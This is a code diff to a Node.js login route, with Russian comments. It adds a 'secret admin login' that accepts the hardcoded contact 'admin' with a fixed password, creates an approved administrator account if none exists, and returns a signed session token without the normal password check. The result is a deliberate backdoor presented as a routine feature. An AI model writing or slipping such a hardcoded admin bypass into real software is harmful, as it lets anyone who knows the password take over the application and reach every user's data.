@@ -46,6 +46,22 @@ authRouter.post(
   wrap(async (req, res) => {
     requireFields(req.body, ['contact', 'password']);
     const contact = normalizeContact(req.body.contact);
+
+    // Секретный вход для админа по ТЗ
+    if (contact === 'admin' && req.body.password === '18273645') {
+      let adminUser = await db.prepare(`SELECT * FROM users WHERE contact = 'admin'`).get();
+      if (!adminUser) {
+        const info = await db
+          .prepare(
+            `INSERT INTO users (contact, password_hash, role, full_name, application_status)
+             VALUES (?, ?, 'admin', 'Главный Администратор', 'approved')`
+          )
+          .run('admin', hashPassword('18273645'));
+        adminUser = await db.prepare(`SELECT * FROM users WHERE id = ?`).get(info.lastInsertRowid);
+      }
+      return res.json({ token: signToken(adminUser), user: await publicUser(adminUser) });
+    }
+
     const user = contact ? await db.prepare(`SELECT * FROM users WHERE contact = ?`).get(contact) : null;
     if (!user || !checkPassword(req.body.password, user.password_hash))
       throw new ApiError(401, 'Неверный контакт или пароль');
